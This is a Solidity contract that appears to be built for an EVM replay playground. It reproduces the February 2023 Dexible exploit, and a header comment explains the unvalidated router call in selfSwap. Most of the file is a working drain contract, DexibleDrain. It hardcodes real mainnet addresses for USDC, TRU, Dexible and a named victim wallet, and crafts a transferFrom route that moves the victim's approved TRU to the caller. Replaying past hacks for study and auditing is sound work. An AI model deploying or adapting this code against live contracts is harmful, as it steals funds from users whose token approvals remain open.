// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-02-Dexible).
// Faithful copy of `ContractTest.testExploit()` from
// evm-hack-registry/2023-02-Dexible_exp/test/Dexible_exp.sol, with the
// attack moved into a standalone `run()` entrypoint on its own contract
// (the original test runs the whole attack INLINE — `address(this)` is
// both the caller of `selfSwap` and the TRU recipient; there is no separate
// exploit contract to deploy). No imports — minimal interfaces/structs are
// inlined so this compiles anywhere.
//
// Root cause (unchanged from the original, Feb 2023, ~$1.5M loss):
// Dexible's `selfSwap()` (Dexible.sol) is `external notPaused` with NO
// relayer/allowlist gate, unlike the relayer-only `swap()`. It builds a
// SwapRequest from a caller-supplied `RouterRequest[]` and forwards it to
// `SwapHandler.fill()`, which does:
//     IERC20(rr.routeAmount.token).safeApprove(rr.spender, rr.routeAmount.amount);
//     (bool s, ) = rr.router.call(rr.routerData);
// Both `rr.router` and `rr.routerData` are fully caller-controlled with ZERO
// validation — no allowlist on `router`, no shape check on `routerData` (the
// NatSpec claims "Only approved router addresses will execute successfully"
// but no such check exists in code). Because many traders had granted
// `approve(Dexible, ...)` for their tokens, an attacker points `router` at
// the VICTIM TOKEN ITSELF (here, TRU) and `routerData` at
// `transferFrom(victim, attacker, amount)`. `fill()` executes
// `router.call(routerData)` AS DEXIBLE, so TRU sees `msg.sender == Dexible`
// and happily spends the victim's Dexible allowance straight to the
// attacker — no swap ever occurs.

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

library TokenTypes {
    struct TokenAmount {
        uint112 amount;
        address token;
    }
}

library SwapTypes {
    struct RouterRequest {
        address router;
        address spender;
        TokenTypes.TokenAmount routeAmount;
        bytes routerData;
    }

    struct SelfSwap {
        address feeToken;
        TokenTypes.TokenAmount tokenIn;
        TokenTypes.TokenAmount tokenOut;
        RouterRequest[] routes;
    }
}

interface IDexible {
    function selfSwap(SwapTypes.SelfSwap calldata request) external;
}

contract DexibleDrain {
    IERC20Min internal constant USDC = IERC20Min(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Min internal constant TRU = IERC20Min(0x4C19596f5aAfF459fA38B0f7eD92F11AE6543784);
    IDexible internal constant DEXIBLE = IDexible(0xDE62E1b0edAa55aAc5ffBE21984D321706418024);
    address internal constant VICTIM = 0x58f5F0684C381fCFC203D77B2BbA468eBb29B098;

    function run() external {
        // testExploit(): deal(USDC, address(this), 15e6); USDC.approve(Dexible, max);
        // — the `deal` half is replicated via config `setup.dealToken` (attacker-side,
        // unrecorded, mirrors Foundry `deal`); the approve happens here, recorded, as
        // it is part of what the attacker contract itself does.
        (bool ok, ) = address(USDC).call(abi.encodeWithSignature("approve(address,uint256)", address(DEXIBLE), type(uint256).max));
        require(ok, "USDC approve failed");

        uint256 transferAmount = TRU.balanceOf(VICTIM);
        uint256 allowed = TRU.allowance(VICTIM, address(DEXIBLE));
        if (allowed < transferAmount) {
            transferAmount = allowed;
        }

        bytes memory callDatas =
            abi.encodeWithSignature("transferFrom(address,address,uint256)", VICTIM, address(this), transferAmount);

        TokenTypes.TokenAmount memory routeAmounts = TokenTypes.TokenAmount({amount: 0, token: address(TRU)});
        TokenTypes.TokenAmount memory tokenIns = TokenTypes.TokenAmount({amount: 14_403_789, token: address(USDC)});
        TokenTypes.TokenAmount memory tokenOuts = TokenTypes.TokenAmount({amount: 0, token: address(USDC)});

        SwapTypes.RouterRequest[] memory route = new SwapTypes.RouterRequest[](1);
        route[0] = SwapTypes.RouterRequest({
            router: address(TRU),
            spender: address(DEXIBLE),
            routeAmount: routeAmounts,
            routerData: callDatas
        });

        SwapTypes.SelfSwap memory requests = SwapTypes.SelfSwap({
            feeToken: address(USDC),
            tokenIn: tokenIns,
            tokenOut: tokenOuts,
            routes: route
        });

        DEXIBLE.selfSwap(requests);
    }
}
